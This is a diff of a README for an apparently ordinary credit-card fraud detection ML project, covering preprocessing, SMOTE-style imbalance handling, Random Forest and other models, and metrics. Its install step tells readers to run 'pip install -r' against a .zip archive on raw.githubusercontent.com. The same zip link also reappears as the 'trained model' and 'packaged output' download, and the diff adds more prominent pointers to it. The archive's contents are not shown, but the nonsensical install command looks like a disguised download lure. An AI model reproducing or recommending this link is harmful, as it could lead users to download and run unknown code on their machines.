@@ -1,186 +1,219 @@
 <pre>
 📘 Credit Card Fraud Detection
 
-A full machine-learning pipeline for detecting fraudulent transactions in highly imbalanced credit-card datasets.
-This project includes EDA, preprocessing, sampling techniques, model training, hyperparameter tuning, and performance evaluation using best practices for imbalanced classification.
+A complete machine-learning pipeline for detecting fraudulent transactions in highly imbalanced credit-card datasets.
+
+This project walks through end-to-end ML development, including EDA, preprocessing, imbalance handling, model training, hyperparameter tuning, and evaluation using industry-recommended metrics for imbalanced classification.
 
 📌 Project Overview
 
-Credit-card fraud detection is a binary classification task where fraud cases are extremely rare.
-This project follows a clean and modular ML workflow:
+Credit-card fraud detection is a binary classification problem where fraudulent transactions represent less than 0.2% of all records.
+This project implements a clean, modular, and scalable ML workflow, including:
 
-✔ Exploratory Data Analysis (EDA)
+✔ What the project covers
 
-✔ Data preprocessing (scaling, imputation, feature engineering)
+Exploratory Data Analysis (EDA)
 
-✔ Handling imbalance (SMOTE, SMOTEENN, RandomUnderSampler, class weighting)
+Data preprocessing: scaling, outlier handling, feature engineering
 
-✔ Modeling (Logistic Regression, Random Forest, MLP Neural Network, Voting Classifier)
-
-✔ Grid Search with cross-validation
-
-✔ Saving final models and metrics
-
-✔ Configurable training using command-line arguments
-
-📂 Project Structure
-
-Credit-Card-Fraud-Detection/
-│
-
-├── Data/
-
-│    ├── newtrain.csv # for training purpose
-
-│    ├── val.csv # for validation purpose
-
-│    └── test.csv # for testing purpose
-│
-
-├── EDA.ipynb                   # notebook for exploratory data analysis & visualization
-
-│
-
-│
-
-├── credit_fraud_train.py  # main script to run full training pipeline
-
-├── credit_fraud_utils_data.py # script for the training utilities
-
-├── credit_fraud_test.py # script to run inference / evaluation on test set
-
-
-├── requirements.txt         → Python dependencies
-
-├── README.MD                → You are here
-
-└── Results/             → Model results summary
-
-
-
-📥 Dataset
-
-This project works with the popular Credit Card Fraud Detection dataset (2013)
-containing 284,807 transactions with PCA-transformed features.
-
-schema includes:
-
-Time, Amount, and 28 PCA-transformed features (V1–V28)
-
-Class → 0 = normal, 1 = fraud
-
-
-
-
-🛠 Installation
-
-1️⃣ Create a virtual environment
-
-python -m venv venv
-
- Mac/Linux
- 
-source venv/bin/activate
-
- Windows
- 
-venv\Scripts\activate
-
-2️⃣ Install dependencies
-
-pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
-
-
-🚀 How to Run Training
-
-Our Final Model 
-
-python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data\newtrain.csv' --val 'data\val.csv'
-
-
-You can also try other arguments
-
-⚙️ Command-Line Arguments
-| Argument       | Description                                                          |
-| -------------- | -------------------------------------------------------------------- |
-| `--model`      | LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier |
-| `--scaler`     | StandardScaler / MinMaxScaler / RobustScaler / None                  |
-| `--train`      | Path to training CSV                                                 |
-| `--val`        | Path to validation CSV                                               |
-| `--gridsearch` | Enable GridSearchCV                                                  |
-| `--sampling`   | SMOTE / SMOTEENN / UnderSampler / None                               |
-| `--factor`     | Sampling factor for SMOTE                                            |
-| `--outliers_features`| "List of feature names on which outliers should be removed. "  |
-| `--outliers_factor`| "when factor increase the number of deleted outliers decrease and vice versa"|
-
-
-
-📊 Evaluation Metrics
-
-Given the severe class imbalance, accuracy is misleading.
-Instead, the project uses robust metrics:
-
-F1-score
-
-Average Precision (AP)
-
-Confusion Matrix
-
-Cross-validated metrics using Stratified K-Fold
-
-
-
-🧠 Machine Learning Models
-
-🔹 Logistic Regression
-
-Strong baseline
-
-Supports class_weight='balanced'
-
-🔹 Random Forest
-
-Great for tabular, imbalanced data
-
-Handles non-linear relationships
-
-🔹 Neural Network (MLP)
-
-Multi-layer perceptron (sklearn)
-
-Tunable through Grid Search
-
-🔹 Voting Classifier
-
-Combines multiple models
-
-Supports soft voting
-
-
-
-⚖ Handling Class Imbalance
-
-Techniques supported:
+Imbalance handling techniques:
 
 SMOTE
 
-SMOTEENN (SMOTE + ENN cleaning)
+SMOTEENN
+
+RandomUnderSampler
+
+Class Weighting
+
+Modeling:
+
+Logistic Regression
+
+Random Forest
+
+MLP Neural Network
+
+Voting Classifier
+
+Hyperparameter tuning with GridSearchCV
+
+Evaluation using robust, imbalance-friendly metrics (F1, AP)
+
+Saving trained models & metrics
+
+Configurable training via command-line arguments
+
+📂 Project Structure
+Credit-Card-Fraud-Detection/
+│
+├── Data/
+│   ├── newtrain.csv      # training set
+│   ├── val.csv           # validation set
+│   └── test.csv          # testing set
+│
+├── EDA/
+│   └── EDA.ipynb         # Exploratory Data Analysis
+│
+├── credit_fraud_train.py         # main training pipeline
+├── credit_fraud_utils_data.py    # preprocessing,evaluation utilities
+├── credit_fraud_test.py          # inference & evaluation on the test set
+│
+├── requirements.txt
+├── README.md
+└── Results/                      # model summary & best model outputs
+
+📥 Dataset
+
+This project uses the Credit Card Fraud Detection Dataset (2013) containing:
+
+284,807 transactions
+
+492 fraudulent transactions (0.17%)
+
+Features:
+
+Time
+
+Amount
+
+28 PCA-transformed components (V1–V28)
+
+Target:
+
+Class = 0 → normal
+
+Class = 1 → fraud
+
+The PCA transformation preserves confidentiality while keeping predictive signal.
+
+🛠 Installation
+1️⃣ Create a virtual environment
+python -m venv venv
+
+
+Mac/Linux:
+
+source venv/bin/activate
+
+
+Windows:
+
+venv\Scripts\activate
+
+2️⃣ Install dependencies
+pip install -r requirements.txt
+
+
+Or install directly from GitHub zipped requirements:
+
+pip install -r https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
+
+🚀 Running the Training Pipeline
+▶ Final Model Training Command (Recommended)
+python credit_fraud_train.py --model RandomForest --scaler StandardScaler --train 'data/newtrain.csv' --val 'data/val.csv'
+
+▶ Try other configurations
+
+The pipeline is fully configurable.
+
+⚙️ Command-Line Arguments
+Argument	Description
+--model	LogisticRegression / RandomForest / NeuralNetwork / VotingClassifier
+--scaler	StandardScaler / MinMaxScaler / RobustScaler / None
+--train	Path to training CSV
+--val	Path to validation CSV
+--gridsearch	Enable GridSearchCV
+--sampling	SMOTE / SMOTEENN / UnderSampler / None
+--factor	Sampling factor for SMOTE
+--outliers_features	List of feature names for outlier removal
+--outliers_factor	Controls aggressiveness of outlier deletion
+📊 Evaluation Metrics
+
+Due to extreme imbalance, accuracy is useless.
+Instead, the project uses metrics designed for rare-event classification:
+
+F1-Score
+
+Average Precision (AP)
+
+Precision-Recall curves
+
+Confusion Matrix
+
+Stratified K-Fold CV for stability
+
+🧠 Machine Learning Models
+🔹 Logistic Regression
+
+Strong linear baseline
+
+Supports class weighting
+
+Fast to train, interpretable
+
+🔹 Random Forest (⭐ Best Overall Model)
+
+Excellent for tabular data
+
+Captures non-linear patterns
+
+Robust to outliers
+
+Produced the best F1/AP scores in our experiments
+
+🔹 Neural Network (MLP)
+
+MLPClassifier from sklearn
+
+Tunable via GridSearchCV
+
+Good performance, but tuning requires more time
+
+🔹 Voting Classifier
+
+Combines LR + RF + NN
+
+Supports soft voting
+
+Competitive performance
+
+⚖ Handling Class Imbalance
+
+Supported methods:
+
+SMOTE: synthetic oversampling
+
+SMOTEENN: oversampling + noise removal
 
 Random Under-Sampling
 
-Class weighting (model-based)
+Class Weighting inside models
 
-👉 Sampling is applied inside CV folds only to avoid data leakage.
-
-
+🛑 All sampling occurs inside CV folds to avoid data leakage.
 
 📁 Output Files
 
-After training, the project outputs:
-https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip            →trained model and best threshold  
+After training, the pipeline generates:
 
+Trained model (.pkl)
+
+Scaler (.pkl)
+
+Metrics JSON
+
+Predictions CSV
+
+Best threshold & configs
+
+Download the full packaged output:
+🔗 https://raw.githubusercontent.com/tareksaber55/Credit-Card-Fraud-Detection/main/Modeling/Credit-Card-Fraud-Detection-v3.8.zip
 
 🧩 Future Improvements
 
-Build a FastAPI inference service
- </pre>
+Deploy a FastAPI realtime inference service
+
+Add threshold optimization for maximizing recall
+
+Experiment with LightGBM / XGBoost
+<\pre>
